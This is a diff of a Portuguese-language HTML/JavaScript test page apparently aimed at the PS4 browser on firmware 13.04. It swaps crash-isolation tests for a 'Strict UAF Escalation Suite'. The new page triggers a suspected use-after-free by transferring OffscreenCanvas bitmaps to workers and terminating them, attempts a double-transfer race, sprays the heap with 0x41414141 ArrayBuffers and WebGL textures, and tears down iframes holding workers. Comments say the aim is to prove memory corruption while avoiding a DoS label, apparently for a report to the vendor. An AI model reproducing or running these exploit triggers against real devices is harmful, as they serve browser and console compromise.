@@ -2,230 +2,211 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Exploit - Root Cause Master Suite</title>
-    
+    <title>PS4 Exploit - Strict UAF & Heap Spray</title>
+    <style>
+        body { background-color: #0d0d0d; color: #00ffcc; font-family: monospace; padding: 20px; }
+        h1, h2 { color: #ff3366; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        p { color: #cccccc; font-size: 14px; }
+        button {
+            background-color: #1a1a1a; color: #fff; border: 1px solid #00ffcc;
+            padding: 12px 15px; margin: 4px 0; cursor: pointer; width: 100%;
+            text-align: left; font-family: monospace; font-size: 14px; transition: 0.2s;
+        }
+        button:hover { background-color: #333; }
+        .stop-btn { background-color: #ff3366; color: white; border: 1px solid #fff; text-align: center; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        #log-container { margin-top: 20px; padding: 15px; background-color: #000; border: 1px solid #333; height: 350px; overflow-y: auto; color: #fff; }
+        .log-entry { margin-bottom: 5px; }
+    </style>
 </head>
 <body>
 
-    <h1>[+] Master Root Cause Isolation Suite</h1>
-    <p>Objetivo: Isolar a causa exata do Kernel Panic de 5 segundos no firmware 13.04 do PS4.</p>
+    <h1>[+] Strict UAF Escalation Suite</h1>
+    <p>Objetivo: Provar corrup√ß√£o de mem√≥ria com o m√≠nimo de threads poss√≠vel (Max 5), evitando a classifica√ß√£o de DoS.</p>
 
-    <div class="section">
-        <h2>Parte 1: Isolamento de VRAM e IPC (Object Serializer)</h2>
-        <button onclick="runTestK_ForcedVRAMAllocation()">[K] VRAM Forcada (getContext + fillRect antes do transfer)</button>
-        <button onclick="runTestL_MessageChannelIPC()">[L] Roteamento IPC via MessageChannel (Ignora a fila do Worker)</button>
-        <button onclick="runTestM_StrictImageBitmap()">[M] Strict Path: Apenas ImageBitmap (Sem fallback para Canvas)</button>
-        <button onclick="runTestN_StrictOffscreenCanvas()">[N] Strict Path: Apenas OffscreenCanvas (Sem ImageBitmap)</button>
-        <button onclick="runTestO_GarbageCollectionDeath()">[O] Teardown via Garbage Collector (Sem w.terminate explicito)</button>
-    </div>
+    <button onclick="runStrictBaselineUAF()">[1] Strict Baseline UAF (Apenas 1 Worker ciclando)</button>
+    <button onclick="runDoubleTransferRace()">[2] Double-Transfer Race (For√ßa Double-Free em 2 Workers)</button>
+    <button onclick="runUAFArrayBufferSpray()">[3] UAF + ArrayBuffer Spray (Tenta sobrescrever a fila IPC)</button>
+    <button onclick="runUAFWebGLTextureSpray()">[4] UAF + WebGL Texture Spray (Tenta sobrescrever a VRAM da AMD)</button>
+    <button onclick="runIframeTeardownBypass()">[5] Iframe Teardown Bypass (Destr√≥i Realm em vez de Terminate)</button>
 
-    <div class="section">
-        <h2>Parte 2: Isolamento de Threads (Pure Worker Exhaustion)</h2>
-        <label style="font-size: 14px; font-weight: bold;">Qtd de Workers por ciclo: </label>
-        <input type="number" id="workerQty" value="50" min="1" max="10000">
-        <br><br>
-        <button onclick="runSpawnAndHold()">[1] Spawn & Hold (Testa o limite estatico de Threads do SO)</button>
-        <button onclick="runBurstLoop()">[2] Burst Loop (Simula a cadencia do Crash Original SEM Canvas)</button>
-    </div>
-
-    <button class="stop-btn" onclick="stopAll()">[ PARAR EXECUCAO / LIMPAR MEMORIA E THREADS ]</button>
+    <br><br>
+    <button class="stop-btn" onclick="stopAll()">[ PARAR EXECU√á√ÉO / LIMPAR ]</button>
 
     <div id="log-container"></div>
 
     <script>
         let currentInterval = null;
-        let activeWorkers = []; // Armazena workers da Parte 2 para limpeza
+        let sprayMemory = []; // Mant√©m o lixo na mem√≥ria
 
         function log(msg) {
             const el = document.getElementById('log-container');
             const time = new Date().toLocaleTimeString('pt-BR', { hour12: false, fractionalSecondDigits: 3 });
-            el.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> ${msg}</div>`;
+            el.innerHTML += `<div class="log-entry">[${time}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        function getQty() {
-            return parseInt(document.getElementById('workerQty').value) || 50;
-        }
-
         function stopAll() {
-            if (currentInterval) {
-                clearInterval(currentInterval);
-                currentInterval = null;
-            }
-            if (activeWorkers.length > 0) {
-                log(`[-] Destruindo ${activeWorkers.length} Workers ativos retidos na memÛria...`);
-                activeWorkers.forEach(w => w.terminate());
-                activeWorkers = [];
-            }
-            log("[-] ExecuÁ„o interrompida. Ambiente limpo.");
+            if (currentInterval) clearInterval(currentInterval);
+            currentInterval = null;
+            sprayMemory = []; // Liberta a mem√≥ria do Heap Spray
+            log("[-] Execu√ß√£o interrompida. Mem√≥ria pulverizada limpa.");
         }
 
-        // ==========================================
-        // PARTE 1: ISOLAMENTO DE VRAM E IPC
-        // ==========================================
+        const workerCode = `onmessage = () => {};`;
+        const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
 
-        const workerCodeBase = `onmessage = (e) => { };`;
-        const urlBase = URL.createObjectURL(new Blob([workerCodeBase], {type: "text/javascript"}));
-
-        function runTestK_ForcedVRAMAllocation() {
+        // --- [1] Strict Baseline UAF ---
+        // Usa estritamente 1 Worker de cada vez. S√≥ cria o pr√≥ximo depois de garantir a morte do anterior.
+        // Se a consola crashear aqui, √© imposs√≠vel a Sony dizer que √© Thread Exhaustion.
+        function runStrictBaselineUAF() {
             stopAll();
-            log("[*] Iniciando Teste K: VRAM ForÁada (AlocaÁ„o prÈvia via draw)...");
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(urlBase);
-                const canvas = new OffscreenCanvas(128, 128);
-                
-                // ForÁa VRAM
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = 'red';
-                ctx.fillRect(0, 0, 128, 128); 
-                
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
-                
-                count++;
-                if (count % 65 === 0) log(`Teste K - IteraÁıes: ${count}`);
-                if (count > 800) { stopAll(); log("[+] Teste K finalizado."); }
-            }, 13);
-        }
-
-        function runTestL_MessageChannelIPC() {
-            stopAll();
-            log("[*] Iniciando Teste L: MessageChannel IPC (Bypass da Fila do Worker)...");
-            const codeMC = `onmessage = (e) => { let port = e.ports[0]; port.onmessage = (msg) => {}; };`;
-            const urlMC = URL.createObjectURL(new Blob([codeMC], {type: "text/javascript"}));
+            log("[*] Iniciando Strict Baseline UAF (Max 1 Worker vivo)...");
             
             let count = 0;
             currentInterval = setInterval(() => {
-                const w = new Worker(urlMC);
-                const mc = new MessageChannel();
-                w.postMessage("init", [mc.port2]);
-                
+                const w = new Worker(url);
                 const canvas = new OffscreenCanvas(128, 128);
                 const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
                 
-                try { mc.port1.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                setTimeout(() => { w.terminate(); mc.port1.close(); }, 7 + Math.random() * 13);
-                
-                count++;
-                if (count % 65 === 0) log(`Teste L - IteraÁıes: ${count}`);
-                if (count > 800) { stopAll(); log("[+] Teste L finalizado."); }
-            }, 13);
-        }
-
-        function runTestM_StrictImageBitmap() {
-            stopAll();
-            log("[*] Iniciando Teste M: Strict ImageBitmap Path...");
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(urlBase);
-                const canvas = new OffscreenCanvas(128, 128);
-                
-                createImageBitmap(canvas).then(bmp => {
-                    try { w.postMessage({bmp: bmp}, [bmp]); } catch(e) {}
-                    setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
-                });
-                
-                count++;
-                if (count % 65 === 0) log(`Teste M - IteraÁıes: ${count}`);
-                if (count > 800) { stopAll(); log("[+] Teste M finalizado."); }
-            }, 13);
-        }
-
-        function runTestN_StrictOffscreenCanvas() {
-            stopAll();
-            log("[*] Iniciando Teste N: Strict OffscreenCanvas Path...");
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(urlBase);
-                const canvas = new OffscreenCanvas(128, 128);
-                
-                try { w.postMessage({canvas: canvas}, [canvas]); } catch(e) {}
-                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
-                
-                count++;
-                if (count % 65 === 0) log(`Teste N - IteraÁıes: ${count}`);
-                if (count > 800) { stopAll(); log("[+] Teste N finalizado."); }
-            }, 13);
-        }
-
-        function runTestO_GarbageCollectionDeath() {
-            stopAll();
-            log("[*] Iniciando Teste O: GC Death (Sem terminate explÌcito)...");
-            let count = 0;
-            currentInterval = setInterval(() => {
-                let w = new Worker(urlBase);
-                let canvas = new OffscreenCanvas(128, 128);
-                let transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
                 try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
                 
-                setTimeout(() => {
-                    w = null; canvas = null; transferred = null;
-                    let garbage = new Uint8Array(1024 * 1024 * 2); // Acorda o GC
-                }, 7 + Math.random() * 13);
+                w.terminate(); // Mata instantaneamente
                 
                 count++;
-                if (count % 65 === 0) log(`Teste O - IteraÁıes: ${count}`);
-                if (count > 800) { stopAll(); log("[+] Teste O finalizado."); }
-            }, 13);
+                if (count % 10 === 0) log(`Ciclos de Colis√£o (Apenas 1 thread ativa): ${count}`);
+                if (count > 200) { stopAll(); log("[+] Teste 1 finalizado."); }
+            }, 100); // 100ms garante que o kernel tem muito tempo para respirar
         }
 
-        // ==========================================
-        // PARTE 2: ISOLAMENTO DE THREADS Puras
-        // ==========================================
-
-        const workerCodePing = `onmessage = (e) => { postMessage("pong"); };`;
-        const urlPing = URL.createObjectURL(new Blob([workerCodePing], {type: "text/javascript"}));
-
-        function runSpawnAndHold() {
+        // --- [2] Double-Transfer Race ---
+        // Usa 2 Workers. Tenta enviar o MESMO ponteiro de VRAM para duas filas IPC diferentes.
+        function runDoubleTransferRace() {
             stopAll();
-            const qty = getQty();
-            log(`[*] Iniciando [Spawn & Hold] com ${qty} Workers puros...`);
+            log("[*] Iniciando Double-Transfer Race (Max 2 Workers vivos)...");
             
-            for(let i = 0; i < qty; i++) {
-                try {
-                    const w = new Worker(urlPing);
-                    w.postMessage("ping");
-                    activeWorkers.push(w);
-                } catch (e) {
-                    log(`[!] Limite nativo atingido no Worker n∫ ${i+1}. Erro: ${e.message}`);
-                    break;
-                }
-            }
-            log(`[+] Retidos ${activeWorkers.length} Workers. Aguardando estabilidade do sistema...`);
-        }
-
-        function runBurstLoop() {
-            stopAll();
-            const qty = getQty();
-            log(`[*] Iniciando [Burst Loop]. Metralhando ${qty} Workers por ciclo (100ms)...`);
-            
-            let cycle = 0;
+            let count = 0;
             currentInterval = setInterval(() => {
-                let tempWorkers = [];
+                const w1 = new Worker(url);
+                const w2 = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
                 
-                for(let i = 0; i < qty; i++) {
-                    try {
-                        const w = new Worker(urlPing);
-                        w.postMessage("ping");
-                        tempWorkers.push(w);
-                    } catch(e) {}
-                }
+                // GATILHO: Tenta o detach duplo
+                try { w1.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                try { w2.postMessage({canvas: transferred}, [transferred]); } catch(e) {} // Deve falhar, mas a race existe
                 
-                setTimeout(() => {
-                    tempWorkers.forEach(w => w.terminate());
-                }, 10 + Math.random() * 20);
+                w1.terminate();
+                w2.terminate();
                 
-                cycle++;
-                if (cycle % 10 === 0) log(`Ciclo ${cycle}: ${cycle * qty} Workers processados.`);
-                
-                if (cycle > 200) {
-                    stopAll();
-                    log("[+] Burst Loop finalizado. O escalonador do SO sobreviveu ‡ carga.");
-                }
+                count++;
+                if (count % 10 === 0) log(`Ciclos de Double-Free: ${count}`);
+                if (count > 200) { stopAll(); log("[+] Teste 2 finalizado."); }
             }, 100);
+        }
+
+        // --- [3] UAF + ArrayBuffer Spray ---
+        // Aqui o bug fica "forte". Destru√≠mos a thread e imediatamente alocamos milhares de buffers
+        // para tentar ocupar o buraco de mem√≥ria deixado pela mensagem IPC nativa que foi "libertada".
+        function runUAFArrayBufferSpray() {
+            stopAll();
+            sprayMemory = [];
+            log("[*] Iniciando UAF + ArrayBuffer Heap Spray...");
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                w.terminate(); // Liberta a estrutura C++ (UAF gerado)
+                
+                // GATILHO: Heap Spray agressivo imediatamente ap√≥s o free()
+                for(let i = 0; i < 50; i++) {
+                    // Preenche com o valor 0x41414141 (AAAA) - Cl√°ssico para identificar controlo no crash dump
+                    let spray = new Uint32Array(1024);
+                    spray.fill(0x41414141); 
+                    sprayMemory.push(spray);
+                }
+                
+                // Limpa o spray antigo para n√£o causar DoS de falta de mem√≥ria (OOM)
+                if (sprayMemory.length > 2000) sprayMemory.splice(0, 1000); 
+                
+                count++;
+                if (count % 10 === 0) log(`Ciclos com Spray de RAM: ${count}`);
+                if (count > 200) { stopAll(); log("[+] Teste 3 finalizado."); }
+            }, 100);
+        }
+
+        // --- [4] UAF + WebGL Texture Spray ---
+        // Igual ao teste 3, mas tentamos sobrescrever a mem√≥ria f√≠sica da placa gr√°fica (AMD)
+        // usando buffers WebGL logo ap√≥s o ponteiro do OffscreenCanvas ser libertado.
+        function runUAFWebGLTextureSpray() {
+            stopAll();
+            sprayMemory = [];
+            log("[*] Iniciando UAF + WebGL VRAM Spray...");
+            
+            // Criamos um contexto WebGL persistente para o Spray
+            const glCanvas = document.createElement('canvas');
+            const gl = glCanvas.getContext('webgl');
+            if (!gl) return log("WebGL n√£o suportado para este teste.");
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                w.terminate(); // Liberta o ponteiro da textura na GPU
+                
+                // GATILHO: Tenta realocar imediatamente aquela textura livre
+                for(let i = 0; i < 10; i++) {
+                    let texture = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, texture);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 128, 128, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(128 * 128 * 4).fill(0x42)); // 0x42 = 'B'
+                    sprayMemory.push(texture);
+                }
+                
+                if (sprayMemory.length > 200) {
+                    // Apaga as texturas mais velhas para evitar OOM puro
+                    for(let j=0; j<100; j++) gl.deleteTexture(sprayMemory.shift());
+                }
+                
+                count++;
+                if (count % 10 === 0) log(`Ciclos com Spray de VRAM: ${count}`);
+                if (count > 200) { stopAll(); log("[+] Teste 4 finalizado."); }
+            }, 100);
+        }
+
+        // --- [5] Iframe Teardown Bypass ---
+        // Evita usar o w.terminate() completamente. Criamos o Worker DENTRO de um Iframe,
+        // enviamos o Canvas, e destru√≠mos o Iframe. Isso for√ßa a destrui√ß√£o do Realm (Contexto)
+        // por um caminho de C++ totalmente diferente.
+        function runIframeTeardownBypass() {
+            stopAll();
+            log("[*] Iniciando Iframe Teardown Bypass...");
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const iframe = document.createElement('iframe');
+                document.body.appendChild(iframe);
+                
+                const w = new iframe.contentWindow.Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                // Em vez de w.terminate(), arrancamos a janela inteira.
+                document.body.removeChild(iframe); 
+                
+                count++;
+                if (count % 10 === 0) log(`Iframes destru√≠dos com Workers pendentes: ${count}`);
+                if (count > 200) { stopAll(); log("[+] Teste 5 finalizado."); }
+            }, 100); // 100ms de folga
         }
     </script>
 </body>
